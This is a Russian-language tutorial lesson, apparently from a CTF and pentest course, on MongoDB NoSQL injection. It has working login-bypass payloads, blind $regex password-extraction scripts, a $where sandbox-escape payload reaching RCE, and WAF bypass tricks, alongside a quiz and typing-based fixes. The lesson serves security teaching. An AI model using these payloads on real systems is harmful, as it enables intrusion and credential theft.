---
id: web-nosql-injection
title: "NoSQL-инъекции: MongoDB, операторы, JS-движки"
category: web
parent: web-nosql-ldap-xpath
difficulty: medium
order: 1
tags: [nosql, mongodb, injection, auth, json]
prerequisites: [web-nosql-ldap-xpath]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "NoSQL-инъекции в MongoDB: операторная инъекция ($ne/$gt/$regex), $where/JS, обход логина и извлечение данных."
---

NoSQL-инъекция — это инъекция **операторов/структуры** в запрос к не-реляционному хранилищу. Классика — MongoDB: если серверный код передаёт JSON из тела запроса прямо в `find()`/`findOne()` без приведения типов, атакующий подставляет операторы (`$ne`, `$gt`, `$regex`, `$where`) вместо строки и обходит аутентификацию или извлекает данные. Отдельная ветвь — инъекция в JS-движок (`$where`, `mapReduce`, `$function`) вплоть до RCE. Встречается в Node.js/Express, PHP, Python (pymongo) приложениях.

## Теория: как ломается запрос

Уязвимый код (Node/Express):

```js
const user = await db.collection('users').findOne({ username: req.body.username, password: req.body.password });
```

Ожидается строка, но тело — JSON, поэтому можно прислать объект-оператор:

```json
{"username": "admin", "password": {"$ne": "x"}}
```

Запрос станет «password не равен 'x'» — истинно для админа → вход без пароля. То же в URL-encoded: `username=admin&password[$ne]=x`.

## Синтаксис NoSQL-операторов

| Оператор | Значение |
|----------|----------|
| `$ne` | не равно |
| `$eq` | равно |
| `$gt` / `$lt` | больше/меньше |
| `$gte` / `$lte` | больше-равно/меньше-равно |
| `$in` / `$nin` | входит/не входит в список |
| `$regex` | регулярное выражение |
| `$exists` | существует ли поле |
| `$where` | JS-предикат (опасно) |
| `$or` / `$and` | логические |
| `$type` | тип поля |
| `$expr` | агрегатное выражение |

Прототип-загрязнение: `$where`/`$function` + `__proto__` иногда дают загрязнение прототипа (см. `web-prototype-pollution`).

## Вектор 1: обход аутентификации

```json
{"username":"admin","password":{"$ne":"anything"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```

URL-encoded форма:

```bash
curl -s -X POST https://app.example/login \
  --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
```

## Вектор 2: извлечение данных через `$regex`

Если вывод различается, подбираем пароль/токен посимвольно:

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
```

`^` — начало строки; `.` — любой символ; `[...]` — класс. По «успех/неуспех» строим oracle. Для больших алфавитов используйте бинарный поиск через диапазоны (`[a-m]`).

## Вектор 3: `$where` / JS-инъекция

`$where` принимает JavaScript-предикат, исполняемый на сервере БД:

```json
{"$where":"this.username=='admin' && this.password[0]=='a'"}
```

Эксплуатация до RCE (если включён серверный JS и есть доступ к `process`/`global`):

```json
{"$where":"function(){return (function(){var x=this;return true})()}"}
{"$where":"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"}
```

Последний payload — классический escape из sandbox MongoDB через `constructor.constructor` → RCE. На практике чаще работает как blind-oracle или DoS (тяжёлый JS), а RCE зависит от версии и конфигурации (`--noscripting` выключает).

## Вектор 4: `$ne/$gt/$in` для blind

```json
{"username":"admin","password":{"$ne":""}}
{"username":{"$in":["admin","root"]},"password":{"$ne":"x"}}
{"username":{"$regex":"^a"},"password":{"$ne":"x"}}
```

Комбинируя `$regex` + `$ne`, можно перечислять пользователей и подбирать пароли без вывода — только по разнице ответов.

## Разобранный пример: обход логина

Шаг 1 — базовый тест:

```bash
curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$ne":"x"}}' -c cookies.txt
```

Шаг 2 — если вернулась сессия/профиль админа — вход выполнен. Иначе попробуйте `{"$gt":""}` для обоих полей.

Шаг 3 — URL-encoded вариант для form-форм:

```bash
curl -s -X POST https://app.example/login --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
```

## Разобранный пример: blind `$regex` extraction

```python
import requests, string
url = "https://app.example/login"
def ok(prefix):
    r = requests.post(url, json={"username":"admin","password":{"$regex":"^"+prefix}})
    return "invalid" not in r.text
pw = ""
for i in range(0, 60):
    for c in string.ascii_letters + string.digits + "{}_-":
        if ok(pw + c):
            pw += c; break
    else:
        break
print("password:", pw)
```

Для ускорения — бинарный поиск по диапазону символов в одном запросе.

## CouchDB и другие хранилища

- **CouchDB** — `_config`/`_users` с admin party, инъекция в Mango-селекторы, RCE через `_config`/`os_process`.
- **Elasticsearch** — script injection (painless) в `_search`, RCE при включённых скриптах.
- **Redis** — не NoSQL-инъекция, а доступ к командам (см. `web-ssrf-protocol-smuggling`).
- **Neo4j** — Cypher-инъекция в `MATCH ... WHERE`.
- **Memcached/InfluxDB** — другие модели, но тот же принцип «недоверенный ввод → запрос».

## Инструменты

- **`curl`** — ручные JSON/URL payload.
- **Burp Repeater** — быстрый перебор операторов.
- **`mongosh`/`mongo`** — понимание запросов и локальная проверка.
- **`nosqlmap`** — автоматизация NoSQL-инъекций.
- **`ffuf`** — поиск API-эндпоинтов.

## Что дальше / decision

1. Форма/API возвращает JSON или принимает вложенные параметры → проверьте `{"$ne":"x"}`.
2. Обход сработал → зафиксируйте доступ, попробуйте извлечь данные через `$regex`.
3. Вывод скрыт → blind `$regex`/`$ne`.
4. Доступен `$where` → пробуйте JS-escape до RCE (аккуратно, можно уронить БД).
5. Дальше — эскалация к RCE через `$function`/mapReduce, если серверный JS включён.

## Частые ошибки

- **Путать NoSQL с SQLi.** Операторы другие; `' OR 1=1` не работает.
- **Не отправить вложенный объект.** В form-формах нужен `password[$ne]=x`.
- **Сдаваться на строковом парсинге.** Если сервер приводит тип — вектор закрыт, ищите другой.
- **Ждать вывода.** Используйте boolean-blind.
- **Уронить БД.** `$where` с тяжёлым JS — DoS; будьте осторожны.
- **Ломать прод.** Только с согласия.

## Полный разбор: blind $regex extraction с выводом

End-to-end извлечение пароля администратора, когда приложение отвечает разным текстом на верный/неверный запрос.

Шаг 1. Находим oracle: подбираем запрос, где ответ меняется.

```bash
# неверный пароль
curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"wrong"}' | head -c 60
# {"error":"invalid credentials"}

# оператор $regex с неверным префиксом
curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$regex":"^zzz"}}' | head -c 60
# {"error":"invalid credentials"}

# с верным префиксом (допустим, пароль начинается на 'f')
curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$regex":"^f"}}' | head -c 60
# {"ok":true,"token":"eyJ..."}
```

Шаг 2. Автоматизируем посимвольный подбор:

```python
import requests, string
URL = "https://app.example/login"
CHARS = string.ascii_letters + string.digits + "_-{}!@#$"
def match(prefix):
    r = requests.post(URL, json={"username":"admin","password":{"$regex":"^"+prefix}})
    return '"ok":true' in r.text
pw = ""
while True:
    for c in CHARS:
        if match(pw + c):
            pw += c; print(pw); break
    else:
        break
print("password =", pw)
```

Вывод по шагам: `f`, `fl`, `fla`, `flag`, `flag{`, … — пока следующий символ не найдётся (значит, строка кончилась).

Шаг 3. Ускоряем бинарным поиском: вместо перебора символов проверяем диапазоны `^flag\{[a-m]` (класс символов), сокращая пространство вдвое за запрос.

## NoSQL в URL и заголовках (не только JSON)

Операторную инъекцию можно доставить не только JSON-телом:

- **Query string:** `?username=admin&password[$ne]=x` (Express с `qs` парсит скобки).
- **Form-urlencoded:** `username=admin&password[$regex]=^a`.
- **JSON с вложенностью:** `{"password":{"$ne":null}}`.
- **Массив:** `password[]=` (в некоторых драйверах превращается в объект).
- **Заголовки/cookie:** если приложение строит запрос из cookie (редко).
- **GraphQL:** аргумент `password: { $ne: "x" }` (если резолвер передаёт объект в Mongo).

Проверяйте все точки входа: тело, query, заголовки, GraphQL-аргументы.

## Reference-таблица: MongoDB-операторы для атак

| Оператор | Payload | Эффект |
|----------|---------|--------|
| `$ne` | `{"$ne":"x"}` | обход пароля |
| `$gt` | `{"$gt":""}` | «больше пустой строки» — истинно |
| `$regex` | `{"$regex":"^a"}` | посимвольное извлечение |
| `$in` | `{"$in":["admin","root"]}` | перебор имён |
| `$exists` | `{"$exists":true}` | поиск документов с полем |
| `$or` | `{"$or":[{},{}]}` | всегда истинно |
| `$where` | `"this.x==1"` | JS-предикат (blind/RCE) |
| `$expr` | `{"$expr":{"$eq":[1,1]}}` | агрегатные выражения |
| `$function` | JS-тело | RCE (MongoDB 4.4+) |
| `$type` | `{"$type":2}` | фильтр по типу |

## Обход защит и фильтров

- **Если `$` фильтруется** — попробуйте URL-кодирование `%24ne`, unicode `\u0024ne`, или вложенность `{"password":{"\u0024ne":"x"}}`.
- **Если объекты запрещены** — используйте `$where` со строкой, если он разрешён.
- **Если включён `--noscripting`** — `$where`/`$function` не работают, остаются `$regex`/`$ne`/`$gt`.
- **WAF по сигнатуре `$ne`** — меняйте оператор на `$gt`, `$gte`, `$nin`.
- **Типизация входа** (строгая проверка `typeof === 'string'`) закрывает вектор — тогда ищите другие параметры (числовые, массивы).

## Что делать дальше / решение

1. **JSON/вложенный ввод** → сразу `{"$ne":"x"}` на пароль.
2. **Обход сработал** → фиксируем доступ, читаем профиль/данные.
3. **Вывод скрыт** → blind `$regex` с `^prefix` (автоматизируем скриптом).
4. **Доступен `$where`/`$function`** → пробуем JS-escape до RCE (аккуратно — можно уронить БД).
5. **Строгая типизация** → ищем другие точки (числовые поля, `$in`-фильтры, GraphQL).
6. Далее — зафиксировать креды/токены и записать артефакт.

## Типизация входа: почему PHP/Python-драйверы тоже уязвимы

MongoDB-драйверы принимают запрос как ассоциативный массив/словарь. Если код берёт значение из пользовательского ввода и **не проверяет тип**, массив превращается в объект-оператор. Пример на PHP:

```php
$user = $collection->findOne([
  'username' => $_POST['username'],   // если пришёл массив — станет оператором
  'password' => $_POST['password'],
]);
```

Запрос `username[$ne]=x&password[$ne]=x` даст `['$ne' => 'x']` в обоих полях → вход. В Python (pymongo) аналогично: `db.users.find_one({"username": request.json["username"]})`, где `username` — словарь `{"$ne": None}`.

Лечится строгой типизацией: `if (!is_string($username)) reject;` или приведением `(string)$username`. Без этого любой не-строковый JSON-тип (объект, массив, `$`-ключ) становится вектором. Всегда проверяйте, приводит ли сервер тип входа, прежде чем отбрасывать NoSQL-инъекцию.

## Elasticsearch и CouchDB: инъекция в другие хранилища

Помимо MongoDB, операторная инъекция встречается в других NoSQL:

- **Elasticsearch:** скрипты в `_search` (`script_fields`, `painless`). Если серверный скриптинг включён, можно вычислять значения и, при слабой изоляции, достигать RCE. Payload — `{"script_fields":{"x":{"script":{"lang":"painless","source":"..."}}}}`.
- **CouchDB:** Mango-селекторы (`{"selector":{...}}`) и админ-интерфейс `_config`/`_users`; при «admin party» доступ без пароля, а `_config` позволяет менять настройки и добиться RCE через `os_process`.
- **Neo4j:** Cypher-инъекция в `MATCH (u:User {name:$name})` при конкатенации строк — аналог SQLi.
- **Redis:** не операторная инъекция, а прямой доступ к командам (см. SSRF/gopher).

Общий принцип один: пользовательский ввод, попадая в структуру запроса без типизации, меняет логику выборки. Ищите не только Mongo, но и все хранилища, к которым приложение строит запросы из ввода.

## Квиз

```quiz
- question: "Как обойти MongoDB-логин через оператор?"
  options:
    - "password: ' OR 1=1--"
    - 'password: {"$ne":"x"}'
    - "password: null"
    - "password: 123"
  answer: 1
  explanation: "Объект-оператор меняет логику findOne."
- question: "Какой оператор используют для посимвольного извлечения?"
  options:
    - "LIKE"
    - "$regex"
    - "MATCH"
    - "="
  answer: 1
  explanation: "Регулярка с ^prefix даёт бинарный сигнал."
- question: "Как передать оператор в form-urlencoded?"
  options:
    - "password=$ne"
    - "password[$ne]=x"
    - "password.ne=x"
    - "password:ne"
  answer: 1
  explanation: "Скобочная нотация создаёт вложенный объект."
- question: "Что опасно в $where?"
  options:
    - "Он медленный"
    - "Выполняет JavaScript на сервере БД (тайминг/инъекция)"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "JS-контекст даёт тайминг-канал и больше."
- question: "Почему SQL-сканеры не находят NoSQL-инъекции?"
  options:
    - "Они медленные"
    - "Другой синтаксис и модель запросов"
    - "Нет TLS"
    - "Нет ошибок"
  answer: 1
  explanation: "NoSQL-операторы не совпадают с SQL-сигнатурами."
```

## Где пригодится

- **CTF (Web):** задачи с JSON-логином/поиском.
- **Bug bounty:** обход аутентификации через тип-конфузию — критичный отчёт.
- **Пентест:** аудит приложений на MongoDB/CouchDB.
- **Работа (AppSec):** типизация входа, запрет операторов в пользовательских данных, отключение `$where`.
